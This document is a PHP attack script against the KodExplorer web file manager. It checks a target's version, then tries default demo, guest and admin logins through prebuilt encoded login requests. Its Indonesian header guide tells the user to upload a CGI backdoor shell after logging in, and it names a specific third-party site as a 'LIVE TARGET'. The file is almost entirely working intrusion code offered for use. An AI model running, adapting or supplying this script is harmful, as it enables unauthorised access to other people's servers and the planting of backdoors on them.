<?php
/**
* @author Z0NK3X
* @package KodExplorer Brute Force
*** GUIDE ***
- Setelah Berhasil Login, silahkan upload file txt atau backdoor cgi shell
- Ektensi shell .cgi
- Path /data/User/{user}/home/file.txt
- {user} = user yang dipake login, klo demo ya berarti pathnya gini
- /data/User/demo/home/file.txt
- contoh
- https://www.target.com/data/User/demo/home/file.txt
*************

LIVE TARGET : https://www.minemagical.com/files/

*************
*/
function getstr($string, $start, $end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function d_u($data){
	if ($data == 1) {
		return ["user" => "demo","pass" => "demo"];
	}elseif ($data == 2) {
		return ["user" => "guest","pass" => "guest"];
	}else{
		return ["user" => "admin","pass" => "admin"];
	}
}function get_version($url){
	$get =  file_get_contents($url);
	if (preg_match('/Powered by KodExplorer/i', $get)) {
	return getstr($get, '<span class="copyright-content">Powered by KodExplorer '," |");
	}else{
	return "Target isn't using KodExplorer";
	}
}
function login($url){
	$option = [
	"debug" => false, // false | true
	];
	$par = parse_url($url);
	$green  = "\e[1;92m";
	$cyan   = "\e[1;36m";
	$normal  = "\e[0m";
	$blue   = "\e[34m";
	$green1 = "\e[0;92m";
	$yellow = "\e[93m";
	$red    = "\e[1;91m";
	$payload["1"] = "/index.php?user/loginSubmit&name=demo&salt=1&checkCode=undefined&password=EH6x05964aWqxCWf6Nk9vncyl0f8pzVZDwv5DZ9MGeEzqv_II&rememberPassword=1&isAjax=1"; // demo
	$payload["2"] = "/index.php?user/loginSubmit&name=guest&salt=1&checkCode=undefined&password=rSA241f94AF4ZVmVrLdQWsaanqbFVM7PCXK0a8rOMWcz6qvUS4w&rememberPassword=1&isAjax=1"; // guest
	$payload["3"] = "/index.php?user/loginSubmit&name=admin&salt=1&checkCode=undefined&password=ir4fqbc97RSkVj8UqlL1NaGThJ1jWzcBjxakB5D90_LgpKS_k-g&rememberPassword=0&isAjax=1"; // admin
	$x = 1;
	echo "[*] Version App : ".get_version($url)."\n";
	foreach ($payload as $pld) {
		$num = $x++;
		$gu = d_u($num);
		//$u = $par["scheme"]."://".$par["host"].$par["path"].$pld;
		$u = $url.$pld;
		echo "+----------------------------------------+\n";
		echo "[*] Trying Login\n";
		echo "[*] Using Payload [".$num."]\n";
		echo "[*] Using User & Pass : ".$gu["user"]."\n";
		if ($option["debug"]) {
		echo "[*] Getting Data From \n$u\n";
	}
		$res = json_decode(file_get_contents($u),1);
		if ($res["code"]) {
			echo $green."[+] Login Success!\n".$normal;
		}else{
			echo $red."[-] Login Failed\n".$normal;
			echo "[*] Error Msg : ".$cyan.$res["data"].$normal."\n";
		}
	}
	echo "+---------------[ FINISH ]---------------+\n";
}
login(readline("Input Target : "));
?>
